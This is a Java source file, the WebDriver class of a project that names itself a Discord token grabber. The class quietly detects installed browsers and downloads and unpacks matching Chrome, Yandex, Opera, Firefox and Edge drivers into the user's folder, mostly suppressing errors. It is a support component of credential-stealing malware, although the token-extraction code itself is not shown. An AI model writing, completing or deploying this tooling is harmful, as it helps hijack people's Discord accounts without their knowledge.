package com.github.dedinc.discordtokengrabber.utils;

import java.io.File;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Scanner;
import org.json.JSONArray;
import org.json.JSONObject;

import com.github.dedinc.discordtokengrabber.Main;

public class WebDriver {

	public void getChromeDriver() {
		try {
			String  cv = Helper.getVersion().getChromeVersion();
			String cdv = "";
			File temp = new File(Paths.get(Main.cd, "Users", Main.username, "chrome.html").toString()); 
			Helper.getDownloader().getHTML("https://chromedriver.storage.googleapis.com/", temp.getPath());
	        Scanner reader = new Scanner(temp);
	        while (reader.hasNextLine()) {
	        	cdv = cv + reader.nextLine().split("<Key>" + cv)[1].split("/")[0];
	        }
	        reader.close();
	        temp.delete();	        
	        String zip = Paths.get(Main.cd, "Users", Main.username, "chromedriver.zip").toString();
	        Helper.getDownloader().download("https://chromedriver.storage.googleapis.com/" + cdv + "/chromedriver_win32.zip", zip);
	        Helper.getZipper().unzip(zip, Paths.get(Main.cd, "Users", Main.username).toString());
	        new File(zip).delete();
		   } catch (Exception e) {
		}
	}

	public void getYandexDriver() {
		String yv = Helper.getVersion().getYandexVersion().replace(".", "").substring(0, 4);
		ArrayList<String> ydvs = new ArrayList<String>();
		String tag = "";
		String url = "";
		JSONArray tags = new JSONArray(Helper.getRequest().get("https://api.github.com/repos/yandex/YandexDriver/tags"));
		for (int i = 0; i != tags.length(); i++) {
			tag = tags.getJSONObject(i).getString("name");
			ydvs.add(tag + "\n" + tag.replace("v", "").replace("-stable", "").replace(".", ""));
		}
		for (int i = 0; i != ydvs.toArray().length; i++) {
			String[] ydv = ydvs.toArray()[i].toString().split("\n");
			if (yv.equals(ydv[1])) {
				tag = ydv[0];
				break;
			}
			if (yv.substring(0, 3).equals(ydv[1].substring(0, 3))) {
				tag = ydv[0];
				break;
			}
		}
		JSONArray assets = new JSONObject(Helper.getRequest().get("https://api.github.com/repos/yandex/YandexDriver/releases/tags/" + tag)).getJSONArray("assets");
		for (int i = 0; i != assets.length(); i++) {
			if (assets.getJSONObject(i).getString("name").contains("win")) {
				url = assets.getJSONObject(i).getString("browser_download_url");
				break;
			}
		}
        String zip = Paths.get(Main.cd, "Users", Main.username, "yandexdriver.zip").toString();
        Helper.getDownloader().download(url, zip);
        Helper.getZipper().unzip(zip, Paths.get(Main.cd, "Users", Main.username).toString());
        new File(zip).delete();
	}
	
	public void getOperaDriver(boolean gx) {
		String ov = Helper.getVersion().getOperaVersion(gx);
		JSONArray tags = new JSONArray(Helper.getRequest().get("https://api.github.com/repos/operasoftware/operachromiumdriver/tags"));
		for (int i = 0; i != tags.length(); i++) {
			String tag = tags.getJSONObject(i).getString("name");
			String release = new JSONObject(Helper.getRequest().get("https://api.github.com/repos/operasoftware/operachromiumdriver/releases/tags/" + tag)).getString("body");
			String name = release.split("]")[0].split("\\[")[1];
			String odv = "";
			try {
				if (name.contains("Stable")) {
					odv = name.split("Stable ")[1];
				} else {
					odv = name.split("Opera ")[1];
				}
				if (ov.equals(odv)) {
			        String zip = Paths.get(Main.cd, "Users", Main.username, "operadriver.zip").toString();
			        Helper.getDownloader().download("https://github.com/operasoftware/operachromiumdriver/releases/download/" + tag + "/operadriver_win32.zip", zip);	
			        Helper.getZipper().unzip(zip, Paths.get(Main.cd, "Users", Main.username).toString());
			        new File(zip).delete();
			        break;
				   }
		     	} catch (Exception e) {
			}
		}
	}
	
	public void getFirefoxDriver() {
		String url = "";
		JSONArray assets = new JSONObject(Helper.getRequest().get("https://api.github.com/repos/mozilla/geckodriver/releases/latest")).getJSONArray("assets");
		for (int i = 0; i != assets.length(); i++) {
			if (assets.getJSONObject(i).getString("name").contains("win32")) {
				url = assets.getJSONObject(i).getString("browser_download_url");
				break;
			}
		}
        String zip = Paths.get(Main.cd, "Users", Main.username, "firefoxdriver.zip").toString();
        Helper.getDownloader().download(url, zip);
        Helper.getZipper().unzip(zip, Paths.get(Main.cd, "Users", Main.username).toString());
        new File(zip).delete();
	}
	
	public void getEdgeDriver() {
		try {
			String  ev = Helper.getVersion().getEdgeVersion();
			String edv = "";	
			File temp = new File(Paths.get(Main.cd, "Users", Main.username, "edge.html").toString());
			Helper.getDownloader().getHTML("https://msedgedriver.azureedge.net/", temp.getPath());
	        Scanner reader = new Scanner(temp);
	        while (reader.hasNextLine()) {
	        	edv = ev + reader.nextLine().split("<Name>" + ev)[1].split("/")[0];
	        }
	        reader.close();
	        temp.delete();
	        String zip = Paths.get(Main.cd, "Users", Main.username, "edgedriver.zip").toString();
	        Helper.getDownloader().download("https://msedgewebdriverstorage.blob.core.windows.net/edgewebdriver/" + edv + "/edgedriver_win32.zip", zip);
	        Helper.getZipper().unzip(zip, Paths.get(Main.cd, "Users", Main.username).toString());
	        new File(zip).delete();
		   } catch (Exception e) {
			   e.printStackTrace();
		}
	}
}